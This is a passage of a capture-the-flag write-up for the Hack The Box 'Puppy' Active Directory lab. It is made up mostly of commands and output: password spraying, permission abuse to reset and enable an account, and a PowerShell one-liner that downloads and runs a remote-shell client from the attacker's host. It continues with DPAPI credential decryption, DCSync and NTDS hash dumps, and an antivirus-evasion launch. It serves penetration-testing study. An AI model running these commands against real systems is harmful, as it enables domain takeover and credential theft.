SMB         DC.PUPPY.HTB    445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:PUPPY.HTB) (signing:True) (SMBv1:False)
LDAP        DC.PUPPY.HTB    389    DC               [-] PUPPY.HTB\steph.cooper_adm:JamieLove2025! KDC_ERR_PREAUTH_FAILED
LDAP        DC.PUPPY.HTB    389    DC               [-] PUPPY.HTB\steph.cooper:JamieLove2025! KDC_ERR_PREAUTH_FAILED
LDAP        DC.PUPPY.HTB    389    DC               [-] PUPPY.HTB\jamie.williams:JamieLove2025! KDC_ERR_PREAUTH_FAILED
[...]
```

Check successful results

```bash
┌──(bravosec㉿fsociety)-[~/htb/Puppy]
└─$ tail -n +1 -F nxc_kerberos.log | grep --line-buffered '\[.\]' | grep --line-buffered -vE 'KDC_ERR_PREAUTH_FAILED|KDC_ERR_C_PRINCIPAL_UNKNOWN|KDC_ERR_CLIENT_REVOKED|\[\*\]'
2025-05-26 01:10:20 | ldap.py:364 - INFO - LDAP        DC.PUPPY.HTB    389    DC               [+] PUPPY.HTB\ant.edwards:Antman2025!
```


## Shell as adam.silver


### DACL Abuse - Write access to adam.silver

- `Anthony J. Edwards` have write access to `Adam D. Silver`
- `Adam D. Silver` is in `Remote Management Users` group, which means the account have WINRM access

```bash
┌──(bravosec㉿fsociety)-[~/htb/Puppy]
└─$ pt set user 'ant.edwards'; pt set pass 'Antman2025!'; echo "$(pt get user):$(pt get pass)" | anew creds.lst

┌──(bravosec㉿fsociety)-[~/htb/Puppy]
└─$ bloodyAD --host $(pt get rhost) -d $(pt get domain) -u "$(pt get user)" -p "$(pt get pass)" -k get writable

distinguishedName: CN=S-1-5-11,CN=ForeignSecurityPrincipals,DC=PUPPY,DC=HTB
permission: WRITE

distinguishedName: CN=Anthony J. Edwards,DC=PUPPY,DC=HTB
permission: WRITE

distinguishedName: CN=Adam D. Silver,CN=Users,DC=PUPPY,DC=HTB
permission: CREATE_CHILD; WRITE
OWNER: WRITE
DACL: WRITE
```

Since **ADCS** is not enabled, we can't create shadow credentials

```bash
┌──(bravosec㉿fsociety)-[~/htb/Puppy]
└─$ nxc ldap $(pt get rhost) -k -u "$(pt get user)" -p "$(pt get pass)" -M adcs
SMB         DC.PUPPY.HTB    445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:PUPPY.HTB) (signing:True) (SMBv1:False)
LDAP        DC.PUPPY.HTB    389    DC               [+] PUPPY.HTB\steph.cooper_adm:FivethChipOnItsWay2025!
ADCS        DC.PUPPY.HTB    389    DC               [*] Starting LDAP search with search filter '(objectClass=pKIEnrollmentService)'
```

We will attempt **targetedkerberoast** via adding a **SPN** to `Adam D. Silver` first, then change its password if hash cracking failed

```bash
┌──(bravosec㉿fsociety)-[~/htb/Puppy]
└─$ hashcat targetedkerberoast.txt /opt/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
hashcat (v6.2.6) starting in autodetect mode
[...]
Status...........: Exhausted
[...]
```

Unfortunately, we have to change `Adam D. Silver`'s password (which is not opsec safe) since its hash is not crackable

```bash
┌──(bravosec㉿fsociety)-[~/htb/Puppy]
└─$ bloodyAD --host $(pt get rhost) -d $(pt get domain) -u "$(pt get user)" -p "$(pt get pass)" -k get object 'CN=Adam D. Silver,CN=Users,DC=PUPPY,DC=HTB' | grep -i 'samacc'
sAMAccountName: adam.silver
sAMAccountType: 805306368

┌──(bravosec㉿fsociety)-[~/htb/Puppy]
└─$ bloodyAD --host $(pt get rhost) -d $(pt get domain) -u "$(pt get user)" -p "$(pt get pass)" -k set password adam.silver 'Bravosec1337!'
[+] Password changed successfully!
```


### DACL Abuse - Enable adam.silver's account

The account was disabled, so we need to enable the account

```bash
┌──(bravosec㉿fsociety)-[~/htb/Puppy]
└─$ nxc smb $(pt get rhost) -k -u 'adam.silver' -p 'Bravosec1337!'
SMB         DC.PUPPY.HTB    445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:PUPPY.HTB) (signing:True) (SMBv1:False)
SMB         DC.PUPPY.HTB    445    DC               [-] PUPPY.HTB\adam.silver:Bravosec1337! STATUS_ACCOUNT_DISABLED
```

Enable `adam.silver`'s account by removing `ACCOUNTDISABLE` flag from UAC attribute

```bash
┌──(bravosec㉿fsociety)-[~/htb/Puppy]
└─$ bloodyAD --host $(pt get rhost) -d $(pt get domain) -u "$(pt get user)" -p "$(pt get pass)" -k remove uac 'adam.silver' -f 'ACCOUNTDISABLE'
[-] ['ACCOUNTDISABLE'] property flags removed from adam.silver's userAccountControl
```

```bash
┌──(bravosec㉿fsociety)-[~/htb/Puppy]
└─$ nxc smb $(pt get rhost) -k -u 'adam.silver' -p 'Bravosec1337!'
SMB         DC.PUPPY.HTB    445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:PUPPY.HTB) (signing:True) (SMBv1:False)
SMB         DC.PUPPY.HTB    445    DC               [+] PUPPY.HTB\adam.silver:Bravosec1337!
```


### 5985 - WINRM

> Since there's a health check script to reset the changes, we can use the one-liner below to redo all the steps
> 
> ```bash
> bloodyAD --host $(pt get rhost) -d $(pt get domain) -u 'ant.edwards' -p 'Antman2025!' -k set password adam.silver 'Bravosec1337!'; bloodyAD --host $(pt get rhost) -d $(pt get domain) -u 'ant.edwards' -p 'Antman2025!' -k remove uac 'adam.silver' -f 'ACCOUNTDISABLE'; evil-winrm -i $(pt get rhost) -u "adam.silver" -p 'Bravosec1337!'
> ```
{: .prompt-tip }

Request a TGT

```bash
┌──(bravosec㉿fsociety)-[~/htb/Puppy]
└─$ pt set user 'adam.silver'; pt set pass 'Bravosec1337!'; echo "$(pt get user):$(pt get pass)" | anew creds.lst
adam.silver:Bravosec1337!

┌──(bravosec㉿fsociety)-[~/htb/Puppy]
└─$ getTGT.py -dc-ip $(pt get ip) "$(pt get domain)"/"$(pt get user)":"$(pt get pass)"
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

[*] Saving ticket in adam.silver.ccache

┌──(bravosec㉿fsociety)-[~/htb/Puppy]
└─$ pt set ticket $(realpath adam.silver.ccache)
```

Winrm

```bash
┌──(bravosec㉿fsociety)-[~/htb/Puppy]
└─$ KRB5CCNAME="$(pt get ticket)" evil-winrm -r $(pt get domain) -i $(pt get dc_fqdn)

Evil-WinRM shell v3.7

Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\adam.silver\Documents> whoami
puppy\adam.silver
*Evil-WinRM* PS C:\Users\adam.silver\Documents> cat ..\Desktop\user.txt
96b8de71a692426e348bda12e9359bea
*Evil-WinRM* PS C:\Users\adam.silver\Documents>
```


# Root Flag
---

## Shell as steph.cooper

### Reverse SSH - Interactive shell

> https://github.com/NHAS/reverse_ssh

Start server

```bash
┌──(bravosec㉿fsociety)-[~/htb/Office]
└─$ cd /opt/sectools/c2/reverse_ssh/bin && ./server 0.0.0.0:443
2024/02/23 22:39:25 Loading files from /opt/sectools/c2/reverse_ssh/bin
2024/02/23 22:39:25 Version:  v2.4.1
2024/02/23 22:39:25 Listening on 0.0.0.0:443
2024/02/23 22:39:25 Loading private key from: /opt/sectools/c2/reverse_ssh/bin/id_ed25519
2024/02/23 22:39:25 Server key fingerprint:  fe76708014a97adea5673c27edf4800c7ec45dc51f90612dfb08593b0ebcd2e2
2024/02/23 22:39:25 Loading authorized keys from: /opt/sectools/c2/reverse_ssh/bin/authorized_keys
2024/02/23 22:39:25 Was unable to read webhooks configuration file
```

Build the client

```bash
┌──(bravosec㉿fsociety)-[/opt/sectools/c2/reverse_ssh]
└─$ RSSH_HOMESERVER=10.10.14.126:443 make
```

Download [reverse_ssh](https://github.com/NHAS/reverse_ssh) client on the machine and start with [windows logon type 9](https://eventlogxp.com/blog/logon-type-what-does-it-mean/) via [RunasCs](https://github.com/antonioCoco/RunasCs) to access WMI properly

```bash
*Evil-WinRM* PS C:\Users\adam.silver\Documents> $RSSH_FP="C:\programdata\client.exe"; iex (new-object net.webclient).DownloadString("http://10.10.14.126/Invoke-RunasCs.ps1"); (new-object System.Net.WebClient).DownloadFile("http://10.10.14.126/client.exe", $RSSH_FP); Invoke-RunasCs -BypassUac -LogonType 9 -Username "x" -Password "x" -Command "$RSSH_FP"

2025/05/25 15:38:26 setting ll:  1
2025/05/25 15:38:26 Forking
```

Connect to the client

```bash
┌──(bravosec㉿fsociety)-[~/htb/Puppy]
└─$ ssh -J 127.0.0.1:443 puppy.adam.silver.dc
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

Install the latest PowerShell for new features and improvements! https://aka.ms/PSWindows

PS C:\Windows\system32> whoami
puppy\adam.silver
```


### Harvesting - Website backups

```bash
PS C:\Windows\system32> (ls -Force \) 2>$null | select Mode,@{N='Owner'; E={$_.GetAccessControl().Owner}},LastWriteTime,Length,FullName | sort LastWriteTime | ft -wrap

Mode   Owner                       LastWriteTime         Length    FullName
----   -----                       -------------         ------    --------
d-----                             5/8/2021 1:20:24 AM             C:\PerfLogs
d----- NT SERVICE\TrustedInstaller 5/8/2021 2:40:21 AM             C:\Program Files (x86)
d--hsl NT AUTHORITY\SYSTEM         2/19/2025 11:32:50 AM           C:\Documents and Settings
d--hs- BUILTIN\Administrators      2/19/2025 11:32:55 AM           C:\Recovery
d--hs- NT AUTHORITY\SYSTEM         2/28/2025 12:31:35 PM           C:\$Recycle.Bin
d--hs-                             3/8/2025 9:00:28 AM             C:\System Volume Information
d----- NT AUTHORITY\SYSTEM         3/8/2025 9:00:58 AM             C:\StorageReports
d-r--- NT SERVICE\TrustedInstaller 4/4/2025 3:40:02 PM             C:\Program Files
d----- BUILTIN\Administrators      5/9/2025 10:48:06 AM            C:\Backups
d----- NT AUTHORITY\SYSTEM         5/12/2025 5:21:12 PM            C:\inetpub
d--h-- BUILTIN\Administrators      5/12/2025 5:29:48 PM            C:\$WinREAgent
d----- NT SERVICE\TrustedInstaller 5/13/2025 4:40:24 PM            C:\Windows
-a-hs-                             5/25/2025 3:13:10 PM  536870912 C:\pagefile.sys
-a-hs-                             5/25/2025 3:13:10 PM  12288     C:\DumpStack.log.tmp
d-r--- NT AUTHORITY\SYSTEM         5/25/2025 3:20:24 PM            C:\Users
d--h-- NT AUTHORITY\SYSTEM         5/25/2025 3:38:25 PM            C:\ProgramData
```

There's a website's backup archive file

```bash
PS C:\Windows\system32> (ls -Force C:\Backups\) 2>$null | select Mode,@{N='Owner'; E={$_.GetAccessControl().Owner}},LastWriteTime,Length,FullName | sort LastWriteTime | ft -wrap

Mode   Owner                  LastWriteTime        Length FullName
----   -----                  -------------        ------ --------
-a---- BUILTIN\Administrators 3/8/2025 8:22:18 AM 4639546 C:\Backups\site-backup-2024-12-30.zip
```

Download the archive

```bash
scp -J 127.0.0.1:443 -r "puppy.adam.silver.dc":"$(FILE='C:\Backups\site-backup-2024-12-30.zip'; echo "${FILE//\\//}")" ./loot
site-backup-2024-12-30.zip   
```

There's an interesting config file called `nms-auth-config.xml.bak`

```bash
┌──(bravosec㉿fsociety)-[~/htb/Puppy]
└─$ cd loot

┌──(bravosec㉿fsociety)-[~/htb/Puppy/loot]
└─$ 7z l site-backup-2024-12-30.zip
[...]

   Date      Time    Attr         Size   Compressed  Name
------------------- ----- ------------ ------------  ------------------------
                    D....            0            0  puppy
                    .....          864          337  puppy/nms-auth-config.xml.bak
[...]
                    .....         7258         2259  puppy/index.html
------------------- ----- ------------ ------------  ------------------------
                               6635053      4630254  40 files, 9 folders
```

Extract the config file

```bash
┌──(bravosec㉿fsociety)-[~/htb/Puppy/loot]
└─$ 7z e site-backup-2024-12-30.zip 'puppy/nms-auth-config.xml.bak'
[...]
```

Got `steph.cooper`'s credential : `steph.cooper:ChefSteph2025!`

```bash
┌──(bravosec㉿fsociety)-[~/htb/Puppy/loot]
└─$ cat nms-auth-config.xml.bak
<?xml version="1.0" encoding="UTF-8"?>
<ldap-config>
    <server>
        <host>DC.PUPPY.HTB</host>
        <port>389</port>
        <base-dn>dc=PUPPY,dc=HTB</base-dn>
        <bind-dn>cn=steph.cooper,dc=puppy,dc=htb</bind-dn>
        <bind-password>ChefSteph2025!</bind-password>
    </server>
    <user-attributes>
        <attribute name="username" ldap-attribute="uid" />
        <attribute name="firstName" ldap-attribute="givenName" />
        <attribute name="lastName" ldap-attribute="sn" />
        <attribute name="email" ldap-attribute="mail" />
    </user-attributes>
    <group-attributes>
        <attribute name="groupName" ldap-attribute="cn" />
        <attribute name="groupMember" ldap-attribute="member" />
    </group-attributes>
    <search-filter>
        <filter>(&(objectClass=person)(uid=%s))</filter>
    </search-filter>
</ldap-config>
```


### Password spray

Always spray discovered passwords to make sure we do not miss anything

```bash
┌──(bravosec㉿fsociety)-[~/htb/Puppy]
└─$ nxc ldap -k $(pt get dc_fqdn) --log nxc_kerberos.log -u ldeep/_users_enabled.lst -p 'ChefSteph2025!' --continue-on-success
SMB         DC.PUPPY.HTB    445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:PUPPY.HTB) (signing:True) (SMBv1:False)
LDAP        DC.PUPPY.HTB    389    DC               [-] PUPPY.HTB\steph.cooper_adm:ChefSteph2025! KDC_ERR_PREAUTH_FAILED
LDAP        DC.PUPPY.HTB    389    DC               [+] PUPPY.HTB\steph.cooper:ChefSteph2025!
LDAP        DC.PUPPY.HTB    389    DC               [-] PUPPY.HTB\jamie.williams:ChefSteph2025! KDC_ERR_PREAUTH_FAILED
LDAP        DC.PUPPY.HTB    389    DC               [-] PUPPY.HTB\adam.silver:ChefSteph2025! KDC_ERR_CLIENT_REVOKED
LDAP        DC.PUPPY.HTB    389    DC               [-] PUPPY.HTB\ant.edwards:ChefSteph2025! KDC_ERR_PREAUTH_FAILED
LDAP        DC.PUPPY.HTB    389    DC               [-] PUPPY.HTB\levi.james:ChefSteph2025! KDC_ERR_PREAUTH_FAILED
LDAP        DC.PUPPY.HTB    389    DC               [-] PUPPY.HTB\Administrator:ChefSteph2025! KDC_ERR_PREAUTH_FAILED
```


### 5985 - WINRM

Since `steph.cooper` is in `Remote Management Users` group, we can WINRM to get a shell

```bash
┌──(bravosec㉿fsociety)-[~/htb/Puppy]
└─$ pt set user 'steph.cooper'; pt set pass 'ChefSteph2025!'; echo "$(pt get user):$(pt get pass)" | anew creds.lst; getTGT.py -dc-ip $(pt get ip) "$(pt get domain)"/"$(pt get user)":"$(pt get pass)"; pt set ticket $(realpath "$(pt get user)".ccache)
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

[*] Saving ticket in steph.cooper.ccache

┌──(bravosec㉿fsociety)-[~/htb/Puppy]
└─$ KRB5CCNAME="$(pt get ticket)" evil-winrm -r $(pt get domain) -i $(pt get dc_fqdn)

Evil-WinRM shell v3.7

Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\steph.cooper\Documents> $RSSH_FP="C:\programdata\client.exe"; iex (new-object net.webclient).DownloadString("http://10.10.14.126/Invoke-RunasCs.ps1"); Invoke-RunasCs -BypassUac -LogonType 9 -Username "x" -Password "x" -Command "$RSSH_FP"

2025/05/25 15:47:33 setting ll:  1
2025/05/25 15:47:33 Forking
```

## Auth as steph.cooper_adm


### DPAPI - Windows credential manager

There's a none-default **Windows Credential Manager** stored data : `C8D69EBE9A43E9DEBF6B5FBD48B521B9`

```bash
┌──(bravosec㉿fsociety)-[~/htb/Puppy]
└─$ ssh -J 127.0.0.1:443 puppy.steph.cooper.dc
Warning: Permanently added 'puppy.steph.cooper.dc' (ED25519) to the list of known hosts.
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

Install the latest PowerShell for new features and improvements! https://aka.ms/PSWindows

PS C:\Windows\system32> ls -fo -r -file $env:LocalAppData\Microsoft\Credentials\, $env:AppData\Microsoft\Credentials\ | select Mode,@{N='Owner'; E={$_.GetAccessControl().Owner}},LastWriteTime,Length,FullName | sort LastWriteTime | ft -wrap

Mode   Owner              LastWriteTime       Length FullName
----   -----              -------------       ------ --------
-a-hs- PUPPY\steph.cooper 3/8/2025 7:54:29 AM    414 C:\Users\steph.cooper\AppData\Roaming\Microsoft\Credentials\C8D69EBE9A43E9DEBF6B5FBD48B521B9
-a-hs- PUPPY\steph.cooper 3/8/2025 8:14:09 AM  11068 C:\Users\steph.cooper\AppData\Local\Microsoft\Credentials\DFBE70A7E5CC19A398EBF1B96859CE5D
```

A master key was modified around the same time when `C8D69EBE9A43E9DEBF6B5FBD48B521B9` was modified at `3/8/2025 7` am

```bash
PS C:\Windows\system32> ls -fo -r -file $env:appdata\Microsoft\Protect\ | select Mode,@{N='Owner'; E={$_.GetAccessControl().Owner}},LastWriteTime,Length,FullName | sort LastWriteTime | ft -wrap

Mode   Owner              LastWriteTime        Length FullName
----   -----              -------------        ------ --------
-a-hs- PUPPY\steph.cooper 2/23/2025 2:36:06 PM     24 C:\Users\steph.cooper\AppData\Roaming\Microsoft\Protect\S-1-5-21-1487982659-1829050783-2281216199-1107\Preferred
-a-hs- PUPPY\steph.cooper 3/8/2025 7:40:36 AM      24 C:\Users\steph.cooper\AppData\Roaming\Microsoft\Protect\CREDHIST
-a-hs- PUPPY\steph.cooper 3/8/2025 7:40:36 AM     740 C:\Users\steph.cooper\AppData\Roaming\Microsoft\Protect\S-1-5-21-1487982659-1829050783-2281216199-1107\556a2412-1275-4ccf-b721-e6a0b4f90407
-a-hs- PUPPY\steph.cooper 3/8/2025 7:40:36 AM      76 C:\Users\steph.cooper\AppData\Roaming\Microsoft\Protect\SYNCHIST
```

> Since we know the password of `steph.cooper`, we can dump the master key and decrypt it without the need of **mimikatz**
{: .prompt-info }

Dump master keys

```bash
┌──(bravosec㉿fsociety)-[~/htb/Puppy]
└─$ SESSION="puppy.steph.cooper.dc"; USER="steph.cooper"

┌──(bravosec㉿fsociety)-[~/htb/Puppy]
└─$ FILE="C:\Users\\$USER\AppData\Roaming\Microsoft\Protect"; scp -J 127.0.0.1:443 -r "$SESSION":"$(echo "${FILE//\\//}")" ./loot/
CREDHIST                                                                                                                                                                       100%   24     0.1KB/s   00:00
556a2412-1275-4ccf-b721-e6a0b4f90407                                                                                                                                           100%  740     3.6KB/s   00:00
Preferred                                                                                                                                                                      100%   24     0.1KB/s   00:00
SYNCHIST  
```

Decrypt master keys

```bash
┌──(bravosec㉿fsociety)-[~/htb/Puppy]
└─$ PASS='ChefSteph2025!'; MASTERKEYS="$(find loot/Protect/ -type f | grep -E '[[:xdigit:]]{8}(-[[:xdigit:]]{4}){3}-[[:xdigit:]]{12}')"; SID="$(echo $MASTERKEYS | head -n1 | rev | cut -d'/' -f 2 | rev)"; echo "$MASTERKEYS" | while read -r f; do r=$(dpapi.py masterkey -sid "$SID" -file "$f" -password "$PASS"); echo "$r" | grep -q 'Decrypted key' && echo "$r"; done
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

[MASTERKEYFILE]
Version     :        2 (2)
Guid        : 556a2412-1275-4ccf-b721-e6a0b4f90407
Flags       :        0 (0)
Policy      : 4ccf1275 (1288639093)
MasterKeyLen: 00000088 (136)
BackupKeyLen: 00000068 (104)
CredHistLen : 00000000 (0)
DomainKeyLen: 00000174 (372)

Decrypted key with User Key (MD4 protected)
Decrypted key: 0xd9a570722fbaf7149f9f9d691b0e137b7413c1414c452f9c77d6d8a8ed9efe3ecae990e047debe4ab8cc879e8ba99b31cdb7abad28408d8d9cbfdcaf319e9c84
```

Dump **Windows Credential Manager**'s **dpapi**-protected data

```bash
┌──(bravosec㉿fsociety)-[~/htb/Puppy]
└─$ FOLDERS=("C:\Users\\$USER\AppData\Roaming\Microsoft\Credentials" "C:\Users\\$USER\AppData\Local\Microsoft\Credentials"); for f in "${FOLDERS[@]}"; do scp -J 127.0.0.1:443 -r "$SESSION":"$(echo "${f//\\//}")" ./loot/; done
C8D69EBE9A43E9DEBF6B5FBD48B521B9                                                                                                                                               100%  414     2.2KB/s   00:00
credd                                                                                                                                                                          100%   11KB  52.9KB/s   00:00
DFBE70A7E5CC19A398EBF1B96859CE5D    
```

Decrypt **Windows Credential Manager**'s **dpapi**-protected data, got a credential : `steph.cooper_adm:FivethChipOnItsWay2025!`

```bash
┌──(bravosec㉿fsociety)-[~/htb/Puppy]
└─$ FILES="$(find loot/Credentials -type f)"; echo "$FILES" | while read -r f; do dpapi.py credential -key "$KEY" -file "$f" | grep -a '^\[' -A10; done
[CREDENTIAL]
LastWritten : 2025-03-08 16:14:09
Flags       : 0x00000030 (CRED_FLAGS_REQUIRE_CONFIRMATION|CRED_FLAGS_WILDCARD_MATCH)
Persist     : 0x00000002 (CRED_PERSIST_LOCAL_MACHINE)
Type        : 0x00000001 (CRED_TYPE_GENERIC)
Target      : WindowsLive:target=virtualapp/didlogical
Description : PersistedCredential
Unknown     :
Username    : 02vpdyzbbgyaqelf
Unknown     :

[CREDENTIAL]
LastWritten : 2025-03-08 16:14:09
Flags       : 0x00000030 (CRED_FLAGS_REQUIRE_CONFIRMATION|CRED_FLAGS_WILDCARD_MATCH)
Persist     : 0x00000002 (CRED_PERSIST_LOCAL_MACHINE)
Type        : 0x00000001 (CRED_TYPE_GENERIC)
Target      : WindowsLive:target=virtualapp/didlogical
Description : PersistedCredential
Unknown     :
Username    : 02vpdyzbbgyaqelf
Unknown     :

[CREDENTIAL]
LastWritten : 2025-03-08 15:54:29
Flags       : 0x00000030 (CRED_FLAGS_REQUIRE_CONFIRMATION|CRED_FLAGS_WILDCARD_MATCH)
Persist     : 0x00000003 (CRED_PERSIST_ENTERPRISE)
Type        : 0x00000002 (CRED_TYPE_DOMAIN_PASSWORD)
Target      : Domain:target=PUPPY.HTB
Description :
Unknown     :
Username    : steph.cooper_adm
Unknown     : FivethChipOnItsWay2025!
```

The credential is valid

```bash
┌──(bravosec㉿fsociety)-[~/htb/Puppy]
└─$ nxc smb $(pt get rhost) -k -u 'steph.cooper_adm' -p 'FivethChipOnItsWay2025!'
SMB         DC.PUPPY.HTB    445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:PUPPY.HTB) (signing:True) (SMBv1:False)
SMB         DC.PUPPY.HTB    445    DC               [+] PUPPY.HTB\steph.cooper_adm:FivethChipOnItsWay2025! (Pwn3d!)
```


## Shell as Administrator


### DCSync

Since `steph.cooper_adm` is in the `Administrators` group, we can **DCSync** to get `Administrator`'s NT hash

```bash
┌──(bravosec㉿fsociety)-[~/htb/Puppy]
└─$ pt set user 'steph.cooper_adm'; pt set pass 'FivethChipOnItsWay2025!'; echo "$(pt get user):$(pt get pass)" | anew creds.lst
steph.cooper_adm:FivethChipOnItsWay2025!

┌──(bravosec㉿fsociety)-[~/htb/Puppy]
└─$ nxc smb $(pt get dc_fqdn) -k -u "$(pt get user)" -p "$(pt get pass)" --log nxc_ntds.log --ntds --user Administrator
SMB         DC.PUPPY.HTB    445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:PUPPY.HTB) (signing:True) (SMBv1:False) (Null Auth:True)
SMB         DC.PUPPY.HTB    445    DC               [+] PUPPY.HTB\steph.cooper_adm:FivethChipOnItsWay2025! (Pwn3d!)
SMB         DC.PUPPY.HTB    445    DC               [+] Dumping the NTDS, this could take a while so go grab a redbull...
SMB         DC.PUPPY.HTB    445    DC               Administrator:500:aad3b435b51404eeaad3b435b51404ee:bb0edc15e49ceb4120c7bd7e6e65d75b:::
SMB         DC.PUPPY.HTB    445    DC               [+] Dumped 1 NTDS hashes to /home/kali/.nxc/logs/ntds/DC.PUPPY.HTB_None_2025-09-30_031434.ntds of which 1 were added to the database
SMB         DC.PUPPY.HTB    445    DC               [*] To extract only enabled accounts from the output file, run the following command:
SMB         DC.PUPPY.HTB    445    DC               [*] cat /home/kali/.nxc/logs/ntds/DC.PUPPY.HTB_None_2025-09-30_031434.ntds | grep -iv disabled | cut -d ':' -f1
SMB         DC.PUPPY.HTB    445    DC               [*] grep -iv disabled /home/kali/.nxc/logs/ntds/DC.PUPPY.HTB_None_2025-09-30_031434.ntds | cut -d ':' -f1
```


### 445 - SMB : WMIEXEC

**OverPass-The-Hash** to request a TGT

```bash
┌──(bravosec㉿fsociety)-[~/htb/Puppy]
└─$ pt set user 'Administrator'; pt set hash 'bb0edc15e49ceb4120c7bd7e6e65d75b'; echo "$(pt get user):$(pt get hash)" | anew hashes.lst
Administrator:bb0edc15e49ceb4120c7bd7e6e65d75b

┌──(bravosec㉿fsociety)-[~/htb/Puppy]
└─$ getTGT.py -dc-ip $(pt get ip) -hashes ":$(pt get hash)" "$(pt get domain)"/"$(pt get user)"; pt set ticket $(realpath "$(pt get user).ccache")
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

[*] Saving ticket in Administrator.ccache
```

Start **reverse_ssh** client as `Administrator` without additional arguments and command output to evade Antivirus / EDR

```bash
┌──(bravosec㉿fsociety)-[~/htb/Puppy]
└─$ KRB5CCNAME="$(pt get ticket)" wmiexec.py -k -no-pass -nooutput -silentcommand -shell-type powershell $(pt get dc_fqdn) "\$RSSH_FP='C:\programdata\client.exe'; start-process -WindowStyle hidden \$RSSH_FP"
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies
```

Connect to **reverse_ssh** client

```bash
┌──(bravosec㉿fsociety)-[~/htb/Puppy]
└─$ ssh -J 127.0.0.1:443 puppy.administrator.dc
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

Install the latest PowerShell for new features and improvements! https://aka.ms/PSWindows

PS C:\> whoami
puppy\administrator
PS C:\> cat C:\Users\Administrator\Desktop\root.txt
5326447083879e91bed2180879d6b66a
```


# Additional
---

## Post exploitation


### Secrets

```bash
┌──(bravosec㉿fsociety)-[~/htb/Puppy]
└─$ getTGT.py -dc-ip $(pt get ip) -hashes ":$(pt get hash)" "$(pt get domain)"/"$(pt get user)"; pt set ticket $(realpath "$(pt get user).ccache")
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

[*] Saving ticket in Administrator.ccache

┌──(bravosec㉿fsociety)-[~/htb/Puppy]
└─$ KRB5CCNAME="$(pt get ticket)" nxc smb $(pt get dc_fqdn) --use-kcache -M ntdsutil -o DIR_RESULT='nxc_ntds'
SMB         DC.PUPPY.HTB    445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:PUPPY.HTB) (signing:True) (SMBv1:False)
SMB         DC.PUPPY.HTB    445    DC               [+] PUPPY.HTB\Administrator from ccache (Pwn3d!)
NTDSUTIL    DC.PUPPY.HTB    445    DC               [*] Dumping ntds with ntdsutil.exe to C:\Windows\Temp\174825937
NTDSUTIL    DC.PUPPY.HTB    445    DC               Dumping the NTDS, this could take a while so go grab a redbull...
NTDSUTIL    DC.PUPPY.HTB    445    DC               [+] NTDS.dit dumped to C:\Windows\Temp\174825937
NTDSUTIL    DC.PUPPY.HTB    445    DC               [*] Copying NTDS dump to /home/kali/htb/Puppy/nxc_ntds
NTDSUTIL    DC.PUPPY.HTB    445    DC               [*] NTDS dump copied to /home/kali/htb/Puppy/nxc_ntds
NTDSUTIL    DC.PUPPY.HTB    445    DC               [+] Deleted C:\Windows\Temp\174825937 remote dump directory
NTDSUTIL    DC.PUPPY.HTB    445    DC               [+] Dumping the NTDS, this could take a while so go grab a redbull...
NTDSUTIL    DC.PUPPY.HTB    445    DC               Administrator:500:aad3b435b51404eeaad3b435b51404ee:bb0edc15e49ceb4120c7bd7e6e65d75b:::
NTDSUTIL    DC.PUPPY.HTB    445    DC               Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
NTDSUTIL    DC.PUPPY.HTB    445    DC               DC$:1000:aad3b435b51404eeaad3b435b51404ee:d5047916131e6ba897f975fc5f19c8df:::
NTDSUTIL    DC.PUPPY.HTB    445    DC               krbtgt:502:aad3b435b51404eeaad3b435b51404ee:a4f2989236a639ef3f766e5fe1aad94a:::
NTDSUTIL    DC.PUPPY.HTB    445    DC               PUPPY.HTB\levi.james:1103:aad3b435b51404eeaad3b435b51404ee:ff4269fdf7e4a3093995466570f435b8:::
NTDSUTIL    DC.PUPPY.HTB    445    DC               PUPPY.HTB\ant.edwards:1104:aad3b435b51404eeaad3b435b51404ee:afac881b79a524c8e99d2b34f438058b:::
NTDSUTIL    DC.PUPPY.HTB    445    DC               PUPPY.HTB\adam.silver:1105:aad3b435b51404eeaad3b435b51404ee:a7d7c07487ba2a4b32fb1d0953812d66:::
NTDSUTIL    DC.PUPPY.HTB    445    DC               PUPPY.HTB\jamie.williams:1106:aad3b435b51404eeaad3b435b51404ee:bd0b8a08abd5a98a213fc8e3c7fca780:::
NTDSUTIL    DC.PUPPY.HTB    445    DC               PUPPY.HTB\steph.cooper:1107:aad3b435b51404eeaad3b435b51404ee:b261b5f931285ce8ea01a8613f09200b:::
NTDSUTIL    DC.PUPPY.HTB    445    DC               PUPPY.HTB\steph.cooper_adm:1111:aad3b435b51404eeaad3b435b51404ee:ccb206409049bc53502039b80f3f1173:::
NTDSUTIL    DC.PUPPY.HTB    445    DC               [+] Dumped 10 NTDS hashes to /home/kali/.nxc/logs/DC_DC.PUPPY.HTB_2025-05-26_193611.ntds of which 9 were added to the database
NTDSUTIL    DC.PUPPY.HTB    445    DC               [*] To extract only enabled accounts from the output file, run the following command:
NTDSUTIL    DC.PUPPY.HTB    445    DC               [*] grep -iv disabled /home/kali/.nxc/logs/DC_DC.PUPPY.HTB_2025-05-26_193611.ntds | cut -d ':' -f1
